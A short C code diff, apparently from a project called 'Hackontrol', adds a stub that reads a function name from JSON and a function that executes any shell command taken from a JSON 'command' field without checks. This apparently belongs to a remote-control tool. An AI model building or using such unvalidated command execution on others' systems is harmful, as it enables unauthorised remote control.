@@ -45,3 +45,48 @@ nullArgument:
 freeFile:
 	LocalFree(file);
 }
+
+void _stdcall ExecuteEntrypointDynamic(const cJSON* const root, const LPCWSTR folderHackontrol) {
+	LPWSTR file = ExecuteGetFile(root, folderHackontrol);
+
+	if(!file) {
+		return;
+	}
+
+	cJSON* functionField = cJSON_GetObjectItem(root, "function");
+
+	if(!functionField || !cJSON_IsString(functionField)) {
+		goto freeFile;
+	}
+
+	LPSTR function = cJSON_GetStringValue(functionField);
+
+	if(!function) {
+		goto freeFile;
+	}
+freeFile:
+	LocalFree(file);
+}
+
+void _stdcall ExecuteEntrypointCommand(const cJSON* const root, const LPCWSTR folderHackontrol) {
+	cJSON* commandField = cJSON_GetObjectItem(root, "command");
+
+	if(!commandField || !cJSON_IsString(commandField)) {
+		return;
+	}
+
+	LPSTR command = cJSON_GetStringValue(commandField);
+
+	if(!command) {
+		return;
+	}
+
+	LPWSTR buffer = KHOPANFormatMessage(L"%S", command);
+
+	if(!buffer) {
+		return;
+	}
+
+	KHOPANExecuteCommand(buffer, FALSE);
+	LocalFree(buffer);
+}
